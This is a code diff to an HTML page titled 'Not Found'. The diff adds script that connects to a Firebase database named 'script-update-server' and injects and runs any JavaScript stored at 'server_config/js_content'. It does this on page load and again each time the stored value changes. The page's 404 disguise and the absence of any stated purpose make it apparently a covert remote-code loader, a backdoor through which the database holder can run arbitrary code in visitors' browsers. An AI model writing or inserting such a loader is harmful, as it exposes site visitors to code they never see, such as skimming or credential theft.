@@ -1,28 +1,55 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Not Found</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Not Found</title>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
 </head>
-
 <body>
 
-<script id="js"></script>
-
 <script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyDuoka8B7oR6blqM6DawxGR7Lz1q6g6n44",
+        authDomain: "script-update-server.firebaseapp.com",
+        databaseURL: "https://script-update-server-default-rtdb.firebaseio.com",
+        projectId: "script-update-server",
+        storageBucket: "script-update-server.firebasestorage.app",
+        messagingSenderId: "1065485832455",
+        appId: "1:1065485832455:web:7705978342f83a9caf35a2"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-fetch("https://script-update-server-default-rtdb.firebaseio.com/users.json")
+    // Pehle se chal rahi script ko rokne ke liye
+    let currentScriptTag = null;
 
-.then(res => res.text())
+    db.ref("server_config/js_content").on("value", (snapshot) => {
+        const remoteJS = snapshot.val();
+        
+        if (remoteJS) {
+            // Purani script ko remove karna (agar exist karti hai)
+            if (currentScriptTag) {
+                currentScriptTag.remove();
+            }
 
-.then(code => {
-
-document.getElementById("js").innerHTML = code;
-
-})
-
+            try {
+                // Naya script element banana
+                const script = document.createElement("script");
+                script.id = "dynamic-js";
+                script.text = remoteJS; // Code insert karna
+                
+                // Body mein add karte hi code chal jayega
+                document.body.appendChild(script);
+                currentScriptTag = script;
+                
+                console.log("Remote JS Loaded Successfully");
+            } catch (err) {
+                console.error("Execution Error:", err);
+            }
+        }
+    });
 </script>
-
 </body>
 </html>
